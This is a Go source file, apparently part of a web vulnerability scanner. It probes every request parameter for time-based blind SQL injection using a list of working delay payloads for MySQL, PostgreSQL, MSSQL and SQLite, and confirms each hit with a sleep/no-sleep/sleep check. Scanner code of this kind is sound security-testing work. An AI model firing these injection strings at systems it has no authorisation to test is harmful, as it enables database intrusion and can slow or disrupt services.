package sqli_time_based_params

import (
	"time"

	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/pkg/errors"
)

// sleepThreshold is the minimum response time to consider a timing injection confirmed.
const sleepThreshold = 12 * time.Second

// timePair represents a sleep/no-sleep payload pair for time-based testing.
type timePair struct {
	dbType   string
	sleepVal string
	noSleep  string
}

// payloadPairs contains sleep/no-sleep pairs for each DB type.
var payloadPairs = []timePair{
	// MySQL
	{dbType: "mysql", sleepVal: "'XOR(if(now()=sysdate(),SLEEP(15),0))XOR'Z", noSleep: "'XOR(if(now()=sysdate(),SLEEP(0),0))XOR'Z"},
	{dbType: "mysql", sleepVal: `"XOR(if(now()=sysdate(),SLEEP(15),0))XOR"Z`, noSleep: `"XOR(if(now()=sysdate(),SLEEP(0),0))XOR"Z`},
	{dbType: "mysql", sleepVal: "if(now()=sysdate(),SLEEP(15),0)", noSleep: "if(now()=sysdate(),SLEEP(0),0)"},
	// PostgreSQL
	{dbType: "postgres", sleepVal: "1233'||(select 99999999 from pg_sleep(15))||'1233", noSleep: "1233'||(select 99999999 from pg_sleep(0))||'1233"},
	{dbType: "postgres", sleepVal: `1233"||(select 99999999 from pg_sleep(15))||"1233`, noSleep: `1233"||(select 99999999 from pg_sleep(0))||"1233`},
	{dbType: "postgres", sleepVal: "(select 99999999 from pg_sleep(15))", noSleep: "(select 99999999 from pg_sleep(0))"},
	{dbType: "postgres", sleepVal: "(select 99999999 from pg_sleep(15)) as test", noSleep: "(select 99999999 from pg_sleep(0)) as test"},
	// MSSQL
	{dbType: "mssql", sleepVal: "9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999", noSleep: "9999' or 1=0 or '0'='9999"},
	{dbType: "mssql", sleepVal: `9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999`, noSleep: `9999" or 1=0 or "0"="9999`},
	{dbType: "mssql", sleepVal: "(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)", noSleep: "(select 1)"},
	{dbType: "mssql", sleepVal: "(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6) as test", noSleep: "(select 1) as test"},
	// SQLite
	{dbType: "sqlite", sleepVal: `9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999`, noSleep: `9999'||(select 1)||'9999`},
	{dbType: "sqlite", sleepVal: `9999"||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"9999`, noSleep: `9999"||(select 1)||"9999`},
	{dbType: "sqlite", sleepVal: "(select like('abcdefg',upper(hex(randomblob(150000000))))) as test", noSleep: "(select 1) as test"},
	{dbType: "sqlite", sleepVal: "(select like('abcdefg',upper(hex(randomblob(150000000)))))", noSleep: "(select 1)"},
}

type Module struct {
	modkit.BaseActiveModule
	rhm dedup.Lazy[dedup.RequestHashManager]
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest,
			modkit.AllInsertionPointTypes,
		),
		rhm: dedup.LazyDefaultRHM("sqli_time_based_params"),
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return results, nil
	}

	points, err := scanCtx.GetInsertionPoints(ctx.Request().Raw(), ctx.Request().ID(), true)
	if err != nil {
		return results, errors.Wrap(err, "failed to create insertion points")
	}

	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		points = rhm.GetNotCheckedInsertionPoints(urlx, ctx.Request(), points)
	}
	if len(points) == 0 {
		return results, nil
	}

ipScan:
	for _, ip := range points {
		for _, pair := range payloadPairs {
			result, err := m.testTimingPair(ctx, httpClient, ip, pair)
			if err != nil {
				if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
					return results, nil
				}
				continue
			}

			if result != nil {
				result.URL = urlx.String()
				results = append(results, result)
				continue ipScan
			}
		}
	}

	return results, nil
}

// testTimingPair implements triple verification: sleep → no-sleep → sleep.
func (m *Module) testTimingPair(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	ip httpmsg.InsertionPoint,
	pair timePair,
) (*output.ResultEvent, error) {
	// Step 1: Send sleep payload (should be slow)
	elapsed1, err := m.sendTimedPayload(ctx, httpClient, ip, pair.sleepVal)
	if err != nil {
		return nil, err
	}
	if elapsed1 < sleepThreshold {
		return nil, nil
	}

	// Step 2: Send no-sleep payload (should be fast)
	elapsedNoSleep, err := m.sendTimedPayload(ctx, httpClient, ip, pair.noSleep)
	if err != nil {
		return nil, err
	}
	if elapsedNoSleep >= sleepThreshold {
		return nil, nil // Server is just slow, not injectable
	}

	// Step 3: Send sleep payload again (should be slow again)
	elapsed2, err := m.sendTimedPayload(ctx, httpClient, ip, pair.sleepVal)
	if err != nil {
		return nil, err
	}
	if elapsed2 < sleepThreshold {
		return nil, nil // Inconsistent — likely false positive
	}

	fuzzedRaw := ip.BuildRequest([]byte(pair.sleepVal))
	return &output.ResultEvent{
		Request:          string(fuzzedRaw),
		FuzzingParameter: ip.Name(),
		ExtractedResults: []string{pair.sleepVal, pair.noSleep, pair.dbType},
		Info: output.Info{
			Description: "Time-based blind SQL injection confirmed via triple verification " +
				"(sleep/no-sleep/sleep). Database type: " + pair.dbType,
		},
	}, nil
}

// sendTimedPayload sends a payload and returns the elapsed wall-clock duration.
func (m *Module) sendTimedPayload(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	ip httpmsg.InsertionPoint,
	payload string,
) (time.Duration, error) {
	fuzzedRaw := ip.BuildRequest([]byte(payload))

	fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
	if err != nil {
		return 0, err
	}
	fuzzedReq = fuzzedReq.WithService(ctx.Service())

	start := time.Now()
	resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true, IgnoreTimeoutTracking: true})
	elapsed := time.Since(start)

	if err != nil {
		return 0, err
	}
	resp.Close()

	return elapsed, nil
}
